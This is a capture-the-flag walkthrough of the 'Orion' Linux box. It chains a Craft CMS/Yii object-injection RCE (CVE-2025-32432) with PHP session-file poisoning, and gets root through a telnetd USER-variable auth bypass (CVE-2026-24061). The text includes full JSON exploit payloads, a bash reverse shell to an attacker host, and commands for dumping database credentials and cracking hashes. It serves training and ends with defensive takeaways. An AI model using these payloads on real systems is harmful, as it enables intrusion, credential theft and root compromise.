Orion

EasyLinux

Orion is an Easy-difficulty Linux box built around a telecom company's Craft CMS site. The foothold chains an unauthenticated RCE in Craft's image-transform endpoint with an object-injection flaw in the underlying Yii framework to poison a PHP session file and smuggle in a payload. Root turns out to be entirely optional for the intended user path and instead comes from a deliberately reinstated legacy service — inetd serving telnet — carrying a decades-old authentication-bypass bug in telnetd itself.

PHASE 1

Reconnaissance

Two open ports, both standard — so the entire attack surface is a single web application once the hostname is resolved.

Full-range port scan

WhyA fast full-range sweep first to make sure nothing is hiding outside the usual top-1000, followed by a detailed version/script scan against only the ports found open.

nmap -p- --min-rate 10000 <TARGET>
nmap -p 22,80 -sCV <TARGET>
22/tcp open ssh   OpenSSH 8.9p1 Ubuntu
80/tcp open http  nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://orion.htb/

NextResolve orion.htb locally and load the site to see what's actually being served.

Fingerprint the web stack

WhyThe HTTP response headers advertise X-Powered-By: Craft CMS, and the application's own debug error page confirms it's running on the Yii PHP framework underneath — the combination that matters here, since Craft is built on top of Yii and several of Craft's historical CVEs are really bugs in how it hands data to Yii.

NextCraft CMS has a documented admin control-panel path; check its version there rather than brute-forcing for it.

Identify the Craft version and admin panel

WhyCraft's own documentation places the control panel at /admin; the login page footer discloses the exact running version.

Craft CMS 5.6.16

NextThat version is squarely inside the affected range for a known preauth RCE — CVE-2025-32432. Confirm and plan the exploit chain before touching the admin login form itself.

CVE-2025-32432 — Craft CMS Preauth RCE via Yii Object Injection

Craft's unauthenticated admin/actions/assets/generate-transform endpoint passes attacker-controlled JSON into the ImageTransform constructor without validating it. Yii's as <name> behavior syntax lets an attacker inject arbitrary object properties, and a separate Yii-framework bug (CVE-2024-58136) means the framework honors a smuggled __class key over the class key Craft actually validates — so an attacker can instantiate any PHP class they like, with constructor arguments of their choosing, entirely preauth. This was added to CISA's Known Exploited Vulnerabilities catalog after being found used in a real in-the-wild campaign.

PHASE 2

Foothold — Proving the Object Injection

Before chasing full RCE, the first move is a low-risk proof of concept: get the injected object to call something harmless and observable, like phpinfo(), to confirm the primitive actually works against this target.

Collect a session and CSRF token

WhyThe vulnerable endpoint still expects a valid session cookie and CSRF token even though it requires no login — both are handed out freely by the public login page.

curl http://orion.htb/admin/login -v -s 2>&1 | grep -i -e 'set-cookie' -e 'type="hidden"'

NextUse the session cookie and CSRF token together in a crafted POST to the vulnerable transform endpoint.

Send the object-injection PoC

WhyThe as session key is added alongside the legitimate handle fields. Craft validates the benign class value, but Yii's constructor-resolution logic prefers the smuggled __class instead — instantiating a GuzzleHttp\Psr7\FnStream object whose _fn_close callback is set to phpinfo.

POST /index.php?p=admin/actions/assets/generate-transform HTTP/1.1
Host: orion.htb
Cookie: CraftSessionId=...; CRAFT_CSRF_TOKEN=...
X-CSRF-Token: ...
Content-Type: application/json

{"assetId": 11, "handle": {"width": 123, "height": 123,
  "as session": {
    "class": "craft\\behaviors\\FieldLayoutBehavior",
    "__class": "GuzzleHttp\\Psr7\\FnStream",
    "__construct()": [[]],
    "_fn_close": "phpinfo"
}}}
A full PHPinfo page renders in the response &mdash; confirming arbitrary class instantiation.

NextSwap the harmless phpinfo gadget for a class that actually executes attacker-controlled PHP from disk.

PHASE 3

Foothold — Session Poisoning for Command Execution

The technique seen used in the wild for this CVE is clever: abuse Craft's own “redirect back after login” feature to smuggle a PHP payload into the session file on disk, then use the object-injection primitive to execute that very file.

Poison the session file with a PHP payload

WhyVisiting an admin URL while logged out triggers a redirect to the login page, but first caches the originally requested URL — including any query string — inside the session file at a predictable path, /var/lib/php/sessions/sess_<id>. A query parameter containing a short PHP snippet lands verbatim inside that file on disk.

GET /index.php?p=admin/dashboard&a=&lt;?=file_put_contents(...)?&gt;

NextUse the yii\rbac\PhpManager gadget, whose constructor takes an itemFile path and executes it as PHP, pointed at the poisoned session file.

Load the poisoned session file as PHP via PhpManager

Whyyii\rbac\PhpManager's constructor accepts an itemFile path that it subsequently includes and executes. Pointing that path at the attacker's own session file (named from the current session cookie) turns the earlier write primitive into genuine code execution.

{"assetId": 11, "handle": {"width": 123, "height": 123,
  "as hack": {
    "class": "\\craft\\behaviors\\FieldLayoutBehavior",
    "__class": "\\yii\\rbac\\PhpManager",
    "__construct()": [{"itemFile": "/var/lib/php/sessions/sess_<id>"}]
}}}

NextValidate blind execution first with something observable over the network, since the endpoint crashes to a 500 either way and returns no output.

Confirm execution blind, then upgrade to a reverse shell

WhyAn ICMP ping back to the attacking host confirms command execution without needing to read any response body; once confirmed, the same request structure with the cmd parameter swapped for a bash reverse-shell one-liner delivers an interactive shell.

cmd=ping -c 1 <LHOST>
# then:
cmd=bash -c 'bash -i >& /dev/tcp/<LHOST>/443 0>&1'
www-data@orion:~/html/craft/web$

NextThis also happens to be a case where a point-and-click Metasploit module exists for the same CVE — worth knowing as the faster path in an authorized engagement with time pressure, alongside the manual method for understanding the mechanics.

PHASE 4

Shell as adam (Optional Path)

Reaching the named user is not strictly required for root on Orion — root is directly reachable from www-data — but the credential chain through the CMS database is worth documenting for completeness, since it demonstrates a classic password-reuse pattern.

Read the Craft .env configuration

WhyCraft's environment file, sitting alongside the application code, holds database credentials in plaintext — standard practice for the framework, but only safe if the file itself is properly access-controlled, which it wasn't from the www-data shell already obtained.

CRAFT_DB_USER=root
CRAFT_DB_PASSWORD=SuperSecureCraft123Pass!

NextThat password doesn't work for the OS-level adam account, but it does authenticate to the local MariaDB instance — dump the users table from there instead.

Dump the application's users table

WhyCraft stores its own application-level users (distinct from OS accounts) in its database, bcrypt-hashed.

mysql -u root -p'SuperSecureCraft123Pass!' -e "use orion; select id,admin,username,email,password from users;"
admin | adam@orion.htb | $2y$13$e9zuohgFZzGtbQalcn9Mz...

NextCrack the recovered bcrypt hash offline rather than attempting to brute-force the live login form.

Crack the bcrypt hash

Whybcrypt is intentionally slow, so a crackable HTB hash is almost always near the top of a common wordlist — and this one breaks in well under a minute against rockyou.txt.

hashcat adam.hash /path/rockyou.txt -m 3200
$2y$13$e9zu...:darkangel

NextTest the cracked password against both su (locally) and SSH (externally) — it works for both, confirming password reuse between the CMS account and the OS account.

Switch user / SSH as adam

WhyThe cracked password works both for a local privilege switch and for direct SSH login — confirming the app-level and OS-level credentials were reused.

su - adam
# or: ssh adam@orion.htb

NextGrab user.txt, then move to enumerating root-reachable services — adam has no sudo rights, so the actual privilege-escalation path lies elsewhere.

PHASE 5

Root — A Deliberately Reinstated Legacy Service

Process enumeration is what gives this away: a process that simply should not exist on a modern Ubuntu install.

Enumerate running processes

WhyA full process listing surfaces inetutils-inetd running as root — the classic Unix “super-server” that modern Ubuntu replaced with systemd socket activation well over a decade ago. Its presence here is not an accident of a stock install; someone had to deliberately apt-install it.

ps auxww | grep inetd
root   1022  /usr/sbin/inetutils-inetd

NextRead its configuration to see exactly what service it's set up to launch, and as which user.

Read the inetd configuration

Whyinetd.conf shows a single active entry: telnet, bound to loopback only, launched as root via the GNU inetutils telnetd implementation.

127.0.0.1:telnet stream tcp nowait root /usr/local/sbin/telnetd telnetd

NextCheck the telnetd version for known CVEs — GNU inetutils telnetd has a notably bad security history.

Identify the telnetd version and research CVEs

WhyVersion 2.7 of GNU inetutils telnetd matches two separate CVEs that both made CISA's KEV catalog around the same time: a buffer-overflow in LINEMODE SLC handling (CVE-2026-32746, which an independent research team publicly noted they couldn't fully weaponize to RCE), and a much simpler, decades-old authentication-bypass bug (CVE-2026-24061) — the practical path here.

telnetd --version
telnetd (GNU inetutils) 2.7
CVE-2026-24061 — telnetd USER Environment-Variable Auth Bypass

telnetd invokes /usr/bin/login (as root) and passes the client-supplied USER environment variable straight through as its final argument, with no sanitization. login itself supports a -f <user> flag that skips password authentication entirely. By setting USER to the literal string -f root and enabling environment forwarding on the telnet client, a remote attacker is logged in as root with zero credentials — a bug whose root cause (unsanitized argument smuggling via an environment variable) predates most of the systems it was later found affecting.

PHASE 6

Root Shell

Exploitation here is almost anticlimactic given everything that led up to it — it's a single environment-variable assignment.

Smuggle -f root through the USER variable

WhySetting USER to -f root and passing -a (auto-login, which forwards the USER env var) to the telnet client triggers the vulnerable code path in the target's login invocation.

USER="-f root" telnet -a localhost
Connected to localhost.
...
Welcome to Ubuntu 22.04.5 LTS
root@orion:~#

NextGrab root.txt to close out the box.

Confirm root flag

WhyFinal checkpoint confirming full compromise.

cat root.txt

Key Takeaways

  • Frameworks that resolve object type from attacker-influenced data (Yii’s __class precedence over class) create a dangerous object-injection surface wherever a higher-level application like Craft CMS passes user input into a constructor without an explicit allow-list of safe classes.
  • Any feature that writes attacker-influenced data to a predictable path on disk (here, a session-cache "redirect back to this URL" convenience) is a file-write primitive in disguise, and should never be combined with a separate gadget capable of executing arbitrary files.
  • Legacy super-server daemons like inetd/telnetd have no place on a modern server; if they must exist for a specific reason, that reason needs to be weighed against a long, ongoing history of serious memory-safety and authentication bugs in those codebases.
  • Password reuse between an application’s own user store (Craft CMS) and OS-level accounts (adam) turned a single cracked hash into both a local login and a remote SSH foothold — enforce separate credential domains.
